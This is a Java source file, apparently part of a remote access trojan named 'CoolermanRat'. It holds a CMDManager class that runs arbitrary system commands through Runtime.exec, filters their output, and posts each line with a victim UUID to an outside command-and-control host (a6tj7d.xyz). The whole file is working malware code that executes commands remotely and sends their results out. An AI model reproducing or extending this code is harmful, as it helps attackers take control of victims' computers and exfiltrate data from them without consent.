package me.dodeedoo.CoolermanRat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class CMDManager {

    private List<String> response = new ArrayList<>();
    private String cmd[];
    private String lookfor = "";

    public List<String> getResponse(Boolean filtered) {
        if (filtered) {
            response.removeIf(line -> !line.contains(lookfor));
        }
        return this.response;
    }

    public String[] getCmd() {
        return this.cmd;
    }

    public String getFilter() {
        return this.lookfor;
    }

    public CMDManager(String cmd[], String lookfor) throws IOException {
        this.cmd = cmd;
        this.lookfor = lookfor;
        List<String> output = executeCommand(cmd);
        if (!lookfor.equals("")) {
            output.removeIf(line -> !line.contains(lookfor));
        }
        for (String line : output) {
            System.out.println(line);
            new Requests("http://a6tj7d.xyz/cmd/" + Main.uuid, "{\"line\":\""+ line +"\"}").execute();
        }
    }

    private List<String> executeCommand(String command[]) {
        List<String> output = new ArrayList<>();
        Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = "";
            while ((line = reader.readLine()) != null) {
                output.add(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return output;
    }
}
